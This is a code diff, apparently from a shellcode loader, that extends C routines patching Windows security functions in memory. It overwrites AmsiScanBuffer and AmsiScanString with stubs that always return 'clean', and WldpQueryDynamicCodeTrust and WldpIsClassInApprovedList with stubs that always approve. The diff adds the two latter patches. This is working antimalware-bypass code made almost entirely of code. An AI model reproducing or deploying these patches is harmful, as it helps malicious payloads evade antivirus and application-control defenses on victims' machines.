@@ -33,17 +33,14 @@
 
 #if defined(BYPASS_AMSI_A)
 
-DECLARE_HANDLE(HAMSICONTEXT);
-DECLARE_HANDLE(HAMSISESSION);
-
 // fake function that always returns S_OK and AMSI_RESULT_CLEAN
 static HRESULT WINAPI AmsiScanBufferStub(
-  HAMSICONTEXT amsiContext,
-  PVOID        buffer,
-  ULONG        length,
-  LPCWSTR      contentName,
-  HAMSISESSION amsiSession,
-  AMSI_RESULT  *result)
+    HAMSICONTEXT amsiContext,
+    PVOID        buffer,
+    ULONG        length,
+    LPCWSTR      contentName,
+    HAMSISESSION amsiSession,
+    AMSI_RESULT  *result)
 {
     *result = AMSI_RESULT_CLEAN;
     return S_OK;
@@ -52,12 +49,12 @@ static HRESULT WINAPI AmsiScanBufferStub(
 static VOID AmsiScanBufferStubEnd(VOID) {}
 
 // fake function that always returns S_OK and AMSI_RESULT_CLEAN
-HRESULT AmsiScanString(
-  HAMSICONTEXT amsiContext,
-  LPCWSTR      string,
-  LPCWSTR      contentName,
-  HAMSISESSION amsiSession,
-  AMSI_RESULT  *result)
+static HRESULT WINAPI AmsiScanStringStub(
+    HAMSICONTEXT amsiContext,
+    LPCWSTR      string,
+    LPCWSTR      contentName,
+    HAMSISESSION amsiSession,
+    AMSI_RESULT  *result)
 {
     *result = AMSI_RESULT_CLEAN;
     return S_OK;
@@ -66,37 +63,56 @@ static VOID AmsiScanStringStubEnd(VOID) {}
 
 BOOL DisableAMSI(PDONUT_INSTANCE inst) {
     BOOL    disabled = FALSE;
-    HMODULE amsi;
+    HMODULE dll;
     DWORD   len, op, t;
     LPVOID  cs, func_ptr;
     
     // load amsi
-    amsi = inst->api.LoadLibraryA(inst->amsi.s);
+    dll = inst->api.LoadLibraryExA(
+      inst->amsi.s, 
+      NULL, 
+      LOAD_LIBRARY_SEARCH_SYSTEM32);
     
-    if(amsi != NULL) {
-      // resolve address of function to patch
-      cs = inst->api.GetProcAddress(amsi, inst->amsiScanBuf);
-      
-      if(cs != NULL) {
-        // calculate length of stub
-        len = (ULONG_PTR)AmsiScanBufferStubEnd -
-          (ULONG_PTR)AmsiScanBufferStub;
-          
-        // make the memory writeable
-        if(inst->api.VirtualProtect(
-          cs, len, PAGE_EXECUTE_READWRITE, &op))
-        {
-          // over write with virtual address of stub
-          Memcpy(cs, ADR(PCHAR, AmsiScanBufferStub), len);
-          
-          disabled = TRUE;
-            
-          // set memory back to original protection
-          inst->api.VirtualProtect(cs, len, op, &t);
-        }
+    if(dll == NULL) return FALSE;
+    
+    // resolve address of AmsiScanBuffer
+    cs = inst->api.GetProcAddress(dll, inst->amsiScanBuf);
+    
+    if(cs != NULL) {
+      // calculate length of stub
+      len = (ULONG_PTR)AmsiScanBufferStubEnd -
+        (ULONG_PTR)AmsiScanBufferStub;
+        
+      // make the memory writeable
+      if(inst->api.VirtualProtect(
+        cs, len, PAGE_EXECUTE_READWRITE, &op))
+      {
+        // over write with virtual address of stub
+        Memcpy(cs, ADR(PCHAR, AmsiScanBufferStub), len);      
+        // set memory back to original protection
+        inst->api.VirtualProtect(cs, len, op, &t);
       }
     }
-    return disabled;
+  
+    // resolve address of AmsiScanString
+    cs = inst->api.GetProcAddress(dll, inst->amsiScanStr);
+    
+    if(cs != NULL) {
+      // calculate length of stub
+      len = (ULONG_PTR)AmsiScanStringStubEnd -
+        (ULONG_PTR)AmsiScanStringStub;
+        
+      // make the memory writeable
+      if(inst->api.VirtualProtect(
+        cs, len, PAGE_EXECUTE_READWRITE, &op))
+      {
+        // over write with virtual address of stub
+        Memcpy(cs, ADR(PCHAR, AmsiScanStringStub), len);   
+        // set memory back to original protection
+        inst->api.VirtualProtect(cs, len, op, &t);
+      }
+    }
+    return TRUE;
 }
 
 #elif defined(BYPASS_AMSI_B)
@@ -114,10 +130,9 @@ BOOL DisableAMSI(PDONUT_INSTANCE inst) {
       NULL, 
       LOAD_LIBRARY_SEARCH_SYSTEM32);
       
-    if(dll == NULL) {
-      return FALSE;
-    }
-    // resolve address of function to patch
+    if(dll == NULL) return FALSE;
+    
+    // resolve address of AmsiScanBuffer
     cs = (PBYTE)inst->api.GetProcAddress(dll, inst->amsiScanBuf);
     
     // scan for signature
@@ -230,6 +245,37 @@ static HRESULT WINAPI WldpQueryDynamicCodeTrustStub(
 
 static VOID WldpQueryDynamicCodeTrustStubEnd(VOID) {}
 
+typedef enum _WLDP_HOST_ID { 
+   WLDP_HOST_ID_UNKNOWN     = 0,
+   WLDP_HOST_ID_GLOBAL      = 1,
+   WLDP_HOST_ID_VBA         = 2,
+   WLDP_HOST_ID_WSH         = 3,
+   WLDP_HOST_ID_POWERSHELL  = 4,
+   WLDP_HOST_ID_IE          = 5,
+   WLDP_HOST_ID_MSI         = 6,
+   WLDP_HOST_ID_MAX         = 7
+} WLDP_HOST_ID, *PWLDP_HOST_ID;
+
+typedef struct _WLDP_HOST_INFORMATION {
+  DWORD        dwRevision;
+  WLDP_HOST_ID dwHostId;
+  PCWSTR       szSource;
+  HANDLE       hSource;
+} WLDP_HOST_INFORMATION, *PWLDP_HOST_INFORMATION;
+
+// fake function that always returns S_OK and isApproved = TRUE
+static HRESULT WINAPI WldpIsClassInApprovedListStub(
+    REFCLSID               classID,
+    PWLDP_HOST_INFORMATION hostInformation,
+    PBOOL                  isApproved,
+    DWORD                  optionalFlags)
+{
+    *isApproved = TRUE;
+    return S_OK;
+}
+
+static VOID WldpIsClassInApprovedListStubEnd(VOID) {}
+
 BOOL DisableWLDP(PDONUT_INSTANCE inst) {
     BOOL    disabled = FALSE;
     HMODULE wldp;
@@ -241,30 +287,46 @@ BOOL DisableWLDP(PDONUT_INSTANCE inst) {
       inst->wldp, NULL, 
       LOAD_LIBRARY_SEARCH_SYSTEM32);
     
-    if(wldp != NULL) {
-      // resolve address of WldpQueryDynamicCodeTrust
-      cs = inst->api.GetProcAddress(wldp, inst->wldpQuery);
+    if(wldp == NULL) return FALSE;
+    
+    // resolve address of WldpQueryDynamicCodeTrust
+    cs = inst->api.GetProcAddress(wldp, inst->wldpQuery);
       
-      if(cs != NULL) {
-        // calculate length of stub
-        len = (ULONG_PTR)WldpQueryDynamicCodeTrustStubEnd -
-          (ULONG_PTR)WldpQueryDynamicCodeTrustStub;
-          
-        // make the memory writeable
-        if(inst->api.VirtualProtect(
-          cs, len, PAGE_EXECUTE_READWRITE, &op))
-        {
-          // overwrite with virtual address of stub
-          Memcpy(cs, ADR(PCHAR, WldpQueryDynamicCodeTrustStub), len);
+    if(cs != NULL) {
+      // calculate length of stub
+      len = (ULONG_PTR)WldpQueryDynamicCodeTrustStubEnd -
+        (ULONG_PTR)WldpQueryDynamicCodeTrustStub;
         
-          disabled = TRUE;
-        
-          // set back to original protection
-          inst->api.VirtualProtect(cs, len, op, &t);
-        }
+      // make the memory writeable
+      if(inst->api.VirtualProtect(
+        cs, len, PAGE_EXECUTE_READWRITE, &op))
+      {
+        // overwrite with virtual address of stub
+        Memcpy(cs, ADR(PCHAR, WldpQueryDynamicCodeTrustStub), len);
+        // set back to original protection
+        inst->api.VirtualProtect(cs, len, op, &t);
       }
     }
-    return disabled;
+    
+    // resolve address of WldpIsClassInApprovedList
+    cs = inst->api.GetProcAddress(wldp, inst->wldpIsApproved);
+      
+    if(cs != NULL) {
+      // calculate length of stub
+      len = (ULONG_PTR)WldpIsClassInApprovedListStubEnd -
+        (ULONG_PTR)WldpIsClassInApprovedListStub;
+        
+      // make the memory writeable
+      if(inst->api.VirtualProtect(
+        cs, len, PAGE_EXECUTE_READWRITE, &op))
+      {
+        // overwrite with virtual address of stub
+        Memcpy(cs, ADR(PCHAR, WldpIsClassInApprovedListStub), len);
+        // set back to original protection
+        inst->api.VirtualProtect(cs, len, op, &t);
+      }
+    }
+    return TRUE;
 }
 #elif defined(BYPASS_WLDP_B)
 // This is where you may define your own WLDP bypass.
